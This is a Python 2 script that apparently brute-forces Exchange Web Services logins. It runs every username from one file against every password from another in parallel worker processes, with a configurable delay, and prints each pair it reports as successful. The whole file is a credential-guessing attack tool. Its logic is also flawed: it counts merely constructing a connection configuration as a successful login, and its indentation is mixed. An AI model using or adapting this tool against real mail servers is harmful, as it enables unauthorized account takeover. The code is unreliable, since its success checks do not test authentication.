import multiprocessing
from exchangelib import DELEGATE, IMPERSONATION, Account, Credentials, ServiceAccount, EWSDateTime, EWSTimeZone, Configuration, NTLM, GSSAPI, CalendarItem, Message,  Mailbox, Attendee, Q, ExtendedProperty, FileAttachment, ItemAttachment, HTMLBody, Build, Version, FolderCollection
import sys, getopt
from time import sleep
import time

halt = False

try:
        import argparse
except ImportError:
        print('Missing needed module: argparse or nmap')
        halt = True
        if halt:
            sys.exit()

parser = argparse.ArgumentParser()
parser.add_argument('-U', metavar='U-file', required=True, type=argparse.FileType('rt'))
parser.add_argument('-P', metavar='P-file', required=True, type=argparse.FileType('rt'))
parser.add_argument('-s', '--server', action='store', dest='Server_ads', required=True, help='IP Address to check')
parser.add_argument('-t', '--threats', action='store', dest='threats', type=int, default=5, help='number of threats')
parser.add_argument('-d', '--delays', action='store', dest='delays', type=int, default=1, help='delays beetween checks')

global args
args = parser.parse_args()

try:
        results = parser.parse_args()

except IOError:
        print("Parser error")
print("Target :"+args.Server_ads)
def connection(process_name,tasks,result_multi,return_dict):
    #print('[%s] evaluation routine starts' % process_name)
    while True:
        new_value = tasks.get()
        #print(type(new_value))
        if type(new_value) == int:
            #print('[%s] evaluation routine quits' % process_name)
            result_multi.put(-1)
            break 
	else:
	    User=new_value[0]
	    Password=new_value[1]
            Server_ads=new_value[2]
            start_time=new_value[3]
            x=new_value[4]
	    #print(User,Password,Server_ads)
	    credentials = Credentials(User,Password)
	    try:
		
                config=Configuration(server=Server_ads,credentials=credentials,auth_type='basic')
                print("\x1b[6;30;42m"+"Success"+"\x1b[0m"+" for :"+User+" and Password:  "+Password)
                elapsed_time = time.time() - start_time
                elapsed_time=time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
                print("Time spend:"+elapsed_time)
                return_dict[x] = "Success"
                result_multi.put("Success")


            
            except Exception, e:
                print(str(e)+" USER: "+User+" password: "+Password)
            result_multi.put("end")
    return "dupa"
# Define IPC manager
manager = multiprocessing.Manager()
# Define a list (queue) for tasks and computation results
tasks = manager.Queue()
result_multi = manager.Queue()
# Create process pool , it can be increased or deacresed 
num_processes = args.threats
pool = multiprocessing.Pool(processes=num_processes)
processes = []
return_dict = manager.dict()
for i in range(num_processes):
# Set process name
    process_name = 'P%i' % i
    # Create the process, and connect it to the worker function
    new_process = multiprocessing.Process(target=connection, args=(process_name,tasks,result_multi,return_dict))
    # Add new process to the list of processes
    processes.append(new_process)
    # Start the process
    new_process.start()
    # Fill task queue
x=0
with results.P as Passwords:
    with results.U as Users:
        for User in Users:
            x=x+1
            start_time = time.time()

            User=User.strip()
            print("Username: "+User)
            results.P.seek(0)
                       
            for Password in Passwords:
                Password=Password.strip()
                data=[User,Password,args.Server_ads,start_time,x]
                tasks.put(data,return_dict)
                sleep(args.delays)
                if return_dict:
                    #print(return_dict.values())
                    try:
                        if return_dict[x]: 
                            break
                    except:
                        pass
for i in range(num_processes):
        tasks.put(-1)						
       
num_finished_processes = 0
        
while True:
    new_result = result_multi.get()
    if new_result == -1:
        num_finished_processes += 1
        if num_finished_processes == num_processes:
            break
        else:
            # Output result
            print('Process closed ')

elapsed_time = time.time() - start_time
elapsed_time=time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
print("Time spend: "+elapsed_time)



